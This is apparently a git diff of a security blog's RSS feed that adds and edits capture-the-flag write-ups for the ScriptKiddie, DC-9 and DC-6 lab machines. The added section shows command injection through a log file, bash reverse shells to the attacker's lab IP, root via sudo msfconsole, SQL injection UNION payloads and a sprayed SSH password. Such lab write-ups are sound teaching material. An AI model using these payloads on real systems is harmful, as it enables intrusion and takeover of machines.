+...&lt;SNIP&gt;...
+-rw-r--r--  <span style="color:#ae81ff">1</span> kid  kid   <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .profile
+drwx------  <span style="color:#ae81ff">2</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 16:11 .ssh
+-rw-r--r--  <span style="color:#ae81ff">1</span> kid  kid     <span style="color:#ae81ff">0</span> Jan  <span style="color:#ae81ff">5</span> 11:10 .sudo_as_admin_successful
+drwxrwxr-x  <span style="color:#ae81ff">5</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:03 html
+drwxrwxrwx  <span style="color:#ae81ff">2</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 logs
+drwxr-xr-x  <span style="color:#ae81ff">3</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:48 snap
+-r--------  <span style="color:#ae81ff">1</span> kid  kid    <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">12</span> 11:35 user.txt
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-pwn">Shell as pwn</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but it&rsquo;s empty.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ ls -la
+total <span style="color:#ae81ff">8</span>
+drwxrwxrwx  <span style="color:#ae81ff">2</span> kid kid <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 .
+drwxr-xr-x <span style="color:#ae81ff">11</span> kid kid <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:49 ..
+-rw-rw-r--  <span style="color:#ae81ff">1</span> kid pwn    <span style="color:#ae81ff">0</span> Jun <span style="color:#ae81ff">14</span> 01:40 hackers
+</code></pre></div><p>I did a quick check on the available users who have shells, and it looks like I need to escalate to <code>pwn</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+kid:x:1000:1000:kid:/home/kid:/bin/bash
+pwn:x:1001:1001::/home/pwn:/bin/bash
+</code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
+/home/pwn/.bash_logout
+/home/pwn/.selected_editor
+/home/pwn/.bashrc
+/home/pwn/.profile
+/home/pwn/scanlosers.sh
+</code></pre></div><p>The script is writable by me.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
+-rwxrwxr-- <span style="color:#ae81ff">1</span> pwn pwn <span style="color:#ae81ff">250</span> Jan <span style="color:#ae81ff">28</span> 17:57 /home/pwn/scanlosers.sh
+</code></pre></div><h4 id="script-analysis">Script analysis</h4>
+<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused with stacked command, but I need to find how the log in <code>hackers</code> file is formatted.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
+<span style="color:#75715e">#!/bin/bash</span>
+
+<span style="color:#75715e"># &lt;== Define log</span>
+log<span style="color:#f92672">=</span>/home/kid/logs/hackers 
+
+cd /home/pwn/
+cat $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u | <span style="color:#66d9ef">while</span> read ip; <span style="color:#66d9ef">do</span>
+    sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/</span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">.nmap </span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
+<span style="color:#66d9ef">done</span>
+<span style="color:#75715e"># &lt;== The log is cleared immediately</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>wc -l &lt; $log<span style="color:#66d9ef">)</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo -n &gt; $log; <span style="color:#66d9ef">fi</span>
+</code></pre></div><p>Looking back into the web source code, I find how the log is formatted in a function called <code>searchsploit</code>. Inserting malicious input on the kid&rsquo;s hack tools will trigger the else condition on this function, which logs date and IP.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">searchsploit</span>(text, srcip):
+    <span style="color:#66d9ef">if</span> regex_alphanum<span style="color:#f92672">.</span>match(text):
+        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;searchsploit&#39;</span>, <span style="color:#e6db74">&#39;--color&#39;</span>, text])
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, searchsploit<span style="color:#f92672">=</span>result<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;UTF-8&#39;</span>, <span style="color:#e6db74">&#39;ignore&#39;</span>))
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/home/kid/logs/hackers&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> f:
+            f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[</span><span style="color:#e6db74">{</span>datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()<span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">{</span>srcip<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, sserror<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stop hacking me - well hack you back&#34;</span>)
+<span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
+</code></pre></div><p>I can trigger an event that logs my IP in the <code>hackers</code> file but then the logs is cleared so fast that I couldn&rsquo;t catch it with the <code>watch</code> command.</p>
+<p><img class="img-container" src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  />
+</p>
+<p>But with this, I could guess that this script is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> is <strong>executed automatically</strong> after a malicious attempt is performed on the site.</p>
+<p>I could generate the same log format in one line:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ python3 -c <span style="color:#e6db74">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
+<span style="color:#f92672">[</span>2021-06-14 00:43:54.924946<span style="color:#f92672">]</span> 127.0.0.1
+</code></pre></div><p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
+</code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ log<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
+→ root@kali «exploits» «10.10.14.31»
+$ echo $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
+127.0.0.1
+</code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
+</code></pre></div><p>It becomes a stacked command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ echo <span style="color:#e6db74">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
+127.0.0.1; bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span>;
+</code></pre></div><p>If I map that format to this line:</p>
+<pre><code>sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot;
+</code></pre><p>It turns into this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
+</code></pre></div><h4 id="exploitation">Exploitation</h4>
+<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and setup my listener on port 9001.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ <span style="color:#66d9ef">while</span> sleep 0.1; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers; <span style="color:#66d9ef">done</span>
+</code></pre></div><p>On my listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «scriptkiddie» «10.10.14.31» 
+$ nc -nvlp <span style="color:#ae81ff">9001</span>             
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">33110</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>868<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+pwn@scriptkiddie:~$ id
+id
+uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span>
+</code></pre></div><p><img class="img-container" src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  />
+</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
+<p>User <code>pwn</code> has sudo privileges on <code>msfconsole</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre></div><p>To exploit this I could just send a reverse shell with <code>-x</code> options on run and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
+</code></pre></div><p>And I&rsquo;m rooted</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
+$ rlwrap nc -nvlp <span style="color:#ae81ff">9005</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9005</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">43512</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>868<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+root@scriptkiddie:/home/pwn# id
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
+cut -c-15 /root/root.txt
+bf7edd4c58e4420
+</code></pre></div><p><img class="img-container" src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  />
+</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></li>
+<li><a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/">https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/</a></li>
+<li><a href="https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3">https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3</a></li>
+<li><a href="http://www.citrucoop.es/jdk-11.0.6/bin/">http://www.citrucoop.es/jdk-11.0.6/bin/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>VulnHub - DC-9</title>
       <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</link>
       <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
@@ -1069,8 +1390,7 @@ $ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">
       <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
 Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
       <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.</p>
-<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule.</p>
-<p>Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p>
+<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p>
 <h3 id="skills-learned">Skills Learned</h3>
 <ul>
 <li>Blind SQL injection</li>
@@ -1154,7 +1474,7 @@ SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
 <p><img class="img-container" src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  />
 </p>
 <h4 id="error-based-sql-injection---database-examination">Error-based SQL injection - Database examination</h4>
-<p>There are 6 columns available and the data type of each columns is string. The query as follows:</p>
+<p>There are 6 columns available and the data type of each columns is string. The injection query is as follows:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>b<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">c</span><span style="color:#e6db74">&#39;,&#39;</span>d<span style="color:#e6db74">&#39;,&#39;</span>e<span style="color:#e6db74">&#39;,&#39;</span>f<span style="color:#e6db74">&#39; -- 
 </span></code></pre></div><p><img class="img-container" src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  />
 </p>
@@ -1167,7 +1487,7 @@ SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>Staff<span style="color:#e6db74">&#39; -- -
 </span></code></pre></div><p><img class="img-container" src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  />
 </p>
-<p>StaffDetails contains the all the staff records which previously seen at the Display All Records menu.</p>
+<p><code>StaffDetails</code> contains the all the staff records which previously seen at the Display All Records menu.</p>
 <p>So, I’ll get the columns on table <code>Users</code> with the following query:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = &#39;</span>Users<span style="color:#e6db74">&#39; -- -
 </span></code></pre></div><p><img class="img-container" src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  />
@@ -1281,20 +1601,20 @@ SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.
 ...
 SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fredf:B4-Tru3-001 
 ...
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-9» «192.168.2.103»
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
 $ ssh fredf@192.168.2.102
-fredf@192.168.2.102&#39;s password:
-Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+fredf@192.168.2.102<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Linux dc-9 4.19.0-6-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
+the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-Last login: Thu Apr  8 20:10:42 2021 from 192.168.2.103
+Last login: Thu Apr  <span style="color:#ae81ff">8</span> 20:10:42 <span style="color:#ae81ff">2021</span> from 192.168.2.103
 fredf@dc-9:~$ id
-uid=1003(fredf) gid=1003(fredf) groups=1003(fredf)
+uid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>fredf<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>fredf<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>fredf<span style="color:#f92672">)</span>
 </code></pre></div><h3 id="shell-as-root">Shell as root</h3>
 <h4 id="sudo-privileges---arbitrary-file-write">Sudo privileges - Arbitrary file write</h4>
 <p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
@@ -1391,302 +1711,6 @@ So long, and thanks <span style="color:#66d9ef">for</span> all the fish.
 <li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
 <li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
 <li><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>VulnHub - DC-6</title>
-      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
-      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
-      <description>DC-6 starts off by enumerating usernames from a WordPress website. I&amp;rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&amp;rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.</description>
-      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>WordPress enumeration and plugin exploitation</li>
-<li>Exploiting sudo privileges on nmap</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Nmap</li>
-<li>Arpscan</li>
-<li>WPScan</li>
-<li>BurpSuite</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
-<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
-$ arp-scan --interface eth0 <span style="color:#e6db74">&#39;192.168.2.0/24&#39;</span> | tee scans/00-arp-scan-dc6
-Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
-Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
-192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
-192.168.2.2     0a:00:27:00:00:07       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
-192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
-</code></pre></div><h3 id="nmap">Nmap</h3>
-<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
-$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span style="color:#e6db74">&#39;192.168.2.104&#39;</span> -v
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey: 
-|   <span style="color:#ae81ff">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-|   <span style="color:#ae81ff">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-|_  <span style="color:#ae81ff">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
-|_http-title: Did not follow redirect to http://wordy/
-|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
-MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span style="color:#75715e"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
-</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">192.168.1.104   wordy
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>This page clearly states that it&rsquo;s a WordPress site.</p>
-<p><img class="img-container" src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  />
-</p>
-<p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
-<p>I ran a <code>gobuster</code> scan but found nothing useful.</p>
-<h4 id="nmap-nse">Nmap NSE</h4>
-<p><code>nmap</code> script scan found some usernames.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
-$ nmap -p <span style="color:#ae81ff">80</span> --script <span style="color:#e6db74">&#34;http-wordpress*&#34;</span> wordy
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-11 23:13 EDT
-Nmap scan report <span style="color:#66d9ef">for</span> wordy <span style="color:#f92672">(</span>192.168.2.104<span style="color:#f92672">)</span>
-Host is up <span style="color:#f92672">(</span>0.00069s latency<span style="color:#f92672">)</span>.
-
-PORT   STATE SERVICE
-80/tcp open  http
-...
-|   /: WordPress version: 5.1.1
-...
-| http-wordpress-users: 
-| Username found: admin
-| Username found: graham
-| Username found: mark
-| Username found: sarah
-| Username found: jens
-|_Search stopped at ID <span style="color:#75715e">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
-MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
-
